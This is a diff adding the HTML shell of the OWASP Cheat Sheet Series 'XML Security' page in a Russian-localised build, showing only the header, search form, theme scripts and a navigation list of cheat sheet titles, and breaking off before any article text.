@@ -1,0 +1,4593 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Website with the collection of all the cheat sheets of the project.">
+      
+      
+      
+        <link rel="canonical" href="https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html">
+      
+      
+        <link rel="prev" href="XML_External_Entity_Prevention_Cheat_Sheet.html">
+      
+      
+        <link rel="next" href="XS_Leaks_Cheat_Sheet.html">
+      
+      
+      <link rel="icon" href="../assets/WebSite_Favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.42">
+    
+    
+      
+        <title>XML Security - OWASP Серия шпаргалок по безопасности</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.0253249f.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#xml" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../index.html" title="OWASP Серия шпаргалок по безопасности" class="md-header__button md-logo" aria-label="OWASP Серия шпаргалок по безопасности" data-md-component="logo">
+      
+  <img src="../assets/OWASP_Logo.svg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            OWASP Серия шпаргалок по безопасности
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              XML Security
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/OWASP/CheatSheetSeries" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    OWASP/CheatSheetSeries
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../index.html" title="OWASP Серия шпаргалок по безопасности" class="md-nav__button md-logo" aria-label="OWASP Серия шпаргалок по безопасности" data-md-component="logo">
+      
+  <img src="../assets/OWASP_Logo.svg" alt="logo">
+
+    </a>
+    OWASP Серия шпаргалок по безопасности
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/OWASP/CheatSheetSeries" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    OWASP/CheatSheetSeries
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../index.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Введение
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Glossary.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Индекс (по алфавиту)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../IndexASVS.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Индекс ASVS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../IndexMASVS.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Индекс MASVS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../IndexProactiveControls.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Индекс превентивных мер
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../IndexTopTen.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Индекс Top 10
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Шпаргалки
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            Шпаргалки
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="AI_Agent_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность AI-агентов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="AJAX_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность AJAX
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Abuse_Case_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Случаи злоупотреблений
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Access_Control_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Контроль доступа
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Attack_Surface_Analysis_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Анализ поверхности атаки
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Authentication_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Аутентификация
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Authorization_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Авторизация
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Authorization_Testing_Automation_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Автоматизация тестирования авторизации
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Automotive_Security.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность автомобилей
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Bean_Validation_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Валидация Bean
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Browser_Extension_Vulnerabilities_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Уязвимости расширений браузера
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="C-Based_Toolchain_Hardening_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Укрепление C-инструментальной цепочки
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="CI_CD_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность CI/CD
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Choosing_and_Using_Security_Questions_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Выбор и использование секретных вопросов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Clickjacking_Defense_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Защита от Clickjacking
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Content_Security_Policy_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Content Security Policy
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Cookie_Theft_Mitigation_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение кражи Cookie
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Credential_Stuffing_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение Credential Stuffing
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение CSRF
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Cross_Site_Scripting_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение XSS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Cryptographic_Storage_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Криптографическое хранилище
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="DOM_Clobbering_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение DOM Clobbering
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="DOM_based_XSS_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение DOM XSS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Database_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность баз данных
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Denial_of_Service_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Отказ в обслуживании
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Dependency_Graph_SBOM_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Граф зависимостей SBOM
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Deserialization_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Десериализация
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Django_REST_Framework_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Django REST Framework
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Django_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность Django
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Docker_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность Docker
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="DotNet_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность .NET
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Drone_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность дронов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Error_Handling_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Обработка ошибок
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="File_Upload_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Загрузка файлов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Forgot_Password_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Восстановление пароля
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="GraphQL_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность GraphQL
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="gRPC_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность gRPC
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="HTML5_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность HTML5
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="HTTP_Headers_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTTP-заголовки
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="HTTP_Strict_Transport_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTTP Strict Transport Security
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Infrastructure_as_Code_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность Infrastructure as Code
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Injection_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение инъекций
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Injection_Prevention_in_Java_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение инъекций в Java
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Input_Validation_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Валидация входных данных
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение IDOR
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="JAAS_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    JAAS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="JSON_Web_Token_for_Java_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    JSON Web Token для Java
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Java_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность Java
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Key_Management_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Управление ключами
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Kubernetes_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность Kubernetes
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Laravel_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Laravel
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="LDAP_Injection_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение LDAP-инъекций
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Legacy_Application_Management_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Управление устаревшими приложениями
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="LLM_Prompt_Injection_Prevention_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Предотвращение LLM Prompt Injection
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Logging_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Логирование
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Logging_Vocabulary_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Словарь событий логирования
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="MCP_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность MCP
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Mass_Assignment_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Массовое присваивание
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Microservices_Security_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Безопасность микросервисов
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="Microservices_based_Security_Arch_Doc_Cheat_Sheet.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
